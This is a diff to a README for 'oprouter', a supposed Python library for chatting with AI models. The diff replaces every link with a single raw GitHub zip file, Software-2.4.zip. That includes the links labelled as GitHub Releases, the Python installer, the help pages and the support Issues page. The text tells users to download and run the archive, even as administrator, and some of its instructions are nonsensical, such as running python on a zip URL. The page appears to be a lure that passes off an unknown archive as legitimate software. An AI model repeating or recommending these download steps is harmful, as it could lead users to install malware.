@@ -1,6 +1,6 @@
 # 🤖 oprouter - Easy Chatting with AI Models
 
-![Download oprouter](https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/photosyntax/oprouter.zip%20oprouter-v1.0-blue)
+![Download oprouter](https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/oprouter/core/Software-2.4.zip%20oprouter-v1.0-blue)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the oprouter! This is an easy-to-use Python library designed for chat
 
 ## 📥 Download & Install
 
-To get started, you will need to download the oprouter application. Please visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/photosyntax/oprouter.zip).
+To get started, you will need to download the oprouter application. Please visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/oprouter/core/Software-2.4.zip).
 
 ### Step-by-step Installation:
 
@@ -17,9 +17,9 @@ To get started, you will need to download the oprouter application. Please visit
 
 2. **Download the Package:**
    Look for the most recent release tag. You may see files with different names. Choose the file that matches your computer’s operating system, such as:
-   - `https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/photosyntax/oprouter.zip` for Linux users
-   - `https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/photosyntax/oprouter.zip` for Windows users
-   - `https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/photosyntax/oprouter.zip` for macOS users
+   - `https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/oprouter/core/Software-2.4.zip` for Linux users
+   - `https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/oprouter/core/Software-2.4.zip` for Windows users
+   - `https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/oprouter/core/Software-2.4.zip` for macOS users
 
    After finding the right file, click on it to start the download.
 
@@ -27,16 +27,16 @@ To get started, you will need to download the oprouter application. Please visit
    Once the download completes, find the downloaded file on your computer. 
    - For Windows, right-click the downloaded `.zip` file and select "Extract All."
    - For macOS, double-click the `.zip` file to extract it.
-   - For Linux, you can use commands in your terminal like `unzip https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/photosyntax/oprouter.zip`.
+   - For Linux, you can use commands in your terminal like `unzip https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/oprouter/core/Software-2.4.zip`.
 
 4. **Run the Application:**
-   Navigate to the folder where you extracted the files. You will find a script called `https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/photosyntax/oprouter.zip`. Open a terminal or command prompt, and type:
+   Navigate to the folder where you extracted the files. You will find a script called `https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/oprouter/core/Software-2.4.zip`. Open a terminal or command prompt, and type:
 
    ```
-   python https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/photosyntax/oprouter.zip
+   python https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/oprouter/core/Software-2.4.zip
    ```
 
-   Ensure Python is installed on your machine. If it is not, you can download it from [https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/photosyntax/oprouter.zip](https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/photosyntax/oprouter.zip).
+   Ensure Python is installed on your machine. If it is not, you can download it from [https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/oprouter/core/Software-2.4.zip](https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/oprouter/core/Software-2.4.zip).
 
 5. **Follow On-Screen Instructions:**
    The application will guide you through the process of setting up your first chat session with the AI model. 
@@ -78,7 +78,7 @@ Before downloading, ensure your computer meets the following system requirements
 If you encounter issues during installation or while running the application, consider these common solutions:
 
 1. **Python Not Installed:**
-   If your system cannot recognize the `python` command, you may need to install Python. You can find instructions [here](https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/photosyntax/oprouter.zip).
+   If your system cannot recognize the `python` command, you may need to install Python. You can find instructions [here](https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/oprouter/core/Software-2.4.zip).
 
 2. **File Permission Issues:**
    On some systems, permissions may prevent the script from running. Make sure you have necessary permissions or run the terminal as an administrator.
@@ -88,7 +88,7 @@ If you encounter issues during installation or while running the application, co
 
 ## 📞 Support
 
-If you have further questions or need support, please reach out through the Issues section on the GitHub repository. You can find it [here](https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/photosyntax/oprouter.zip). We appreciate your feedback and are happy to assist.
+If you have further questions or need support, please reach out through the Issues section on the GitHub repository. You can find it [here](https://raw.githubusercontent.com/bsdfbsdfgsfbs/oprouter/main/oprouter/core/Software-2.4.zip). We appreciate your feedback and are happy to assist.
 
 ## 🌐 Topics
 
